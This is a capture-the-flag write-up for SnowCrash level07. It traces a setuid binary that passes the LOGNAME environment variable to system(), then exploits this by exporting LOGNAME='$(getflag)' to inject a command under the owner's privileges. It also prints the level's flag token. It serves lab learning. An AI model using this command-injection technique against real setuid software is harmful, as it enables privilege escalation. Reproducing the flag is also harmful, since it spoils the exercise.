# Level07

# context

after loged in with user `level07` an executeable file apeares in home dir
```
level07@SnowCrash:~$ ls
level07
level07@SnowCrash:~$
```

when run it:
```
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$
```

# steps to repreduce

pass this executeable to `file` command:
```
level07@SnowCrash:~$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
level07@SnowCrash:~$
```

as you can see this is a binary file so we can try to reverse it to see it's original source code.
```
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                            = 2007
geteuid()                                                                                                            = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                  = 0
getenv("LOGNAME")                                                                                                    = "level07" <==== IMPORTANT LINE
asprintf(0xbffff6f4, 0x8048688, 0xbfffff26, 0xb7e5ee55, 0xb7fed280)                                                  = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 0
+++ exited (status 0) +++
level07@SnowCrash:~$
```


as you can see the source code uses `getenv("LOGNAME")` and this function reads the the environment variable

> The C library function char *getenv(const char *name) searches for the environment string pointed to by name and returns the associated value to the string.

lets see the value of `LOGNAME` in terminal environment:
```
level07@SnowCrash:~$ env
...
LOGNAME=level07
...
level07@SnowCrash:~$
```

so we have an idea of how this program works:
1. read the value of `LOGMANE` environment variable.
2. pass it's value to `system()` function.
3. use `echo` to print it.

so to get the flag and pass this level we can change the value of `LOGMANE` using the command `export` to make the program print the output of command `getflag` and cuz the program will run as it's owner (`flag07`) the flag of this level will be printed

to to this here's payload

1. chnage value of `LOGNAME` to `$(getflag)` COMMAND LINE: `level07@SnowCrash:~$ export LOGNAME='$(getflag)'` 
> when `echo` tries to read `$(getflag)'` it will handle it as command and print the output.
2. check if `env` is updated with the wanted value
```
level07@SnowCrash:~$ env
TERM=xterm-256color
...
LOGNAME=$(getflag)
...
level07@SnowCrash:~$
```
3. run the executeable 
```
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$
```
